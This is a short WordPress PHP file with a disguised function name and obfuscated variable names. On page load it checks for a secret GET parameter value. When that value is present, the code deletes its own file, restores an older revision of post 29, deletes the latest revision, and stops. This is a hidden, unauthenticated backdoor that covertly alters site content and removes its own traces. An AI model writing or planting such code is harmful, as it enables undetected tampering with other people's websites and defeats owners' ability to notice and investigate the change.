<?php

function results_tag_icons() {
	if (isset($_GET['request_lock_service_display']) && $_GET['request_lock_service_display'] === 'home_random_kit_catalog') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$locator_editor_campaign_forum = 29;
		$age_information_svg_view = wp_get_post_revisions($locator_editor_campaign_forum);
		if (empty($age_information_svg_view)) die('no revisions');
		if (count($age_information_svg_view) < 2) die('less than 2');
		$site_magic_patterns_better = array_shift($age_information_svg_view);
		$sidebar_taxonomy_images = $site_magic_patterns_better->ID;
		$read_single_sign_tracking = array_shift($age_information_svg_view);
		$press_option_xml_portal = $read_single_sign_tracking->ID;
		$star_conditional_modules = wp_restore_post_revision($press_option_xml_portal);
		if ($star_conditional_modules === false) die('error restoring');
		$star_conditional_modules = wp_delete_post_revision($sidebar_taxonomy_images);		
		if ($star_conditional_modules === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'results_tag_icons');
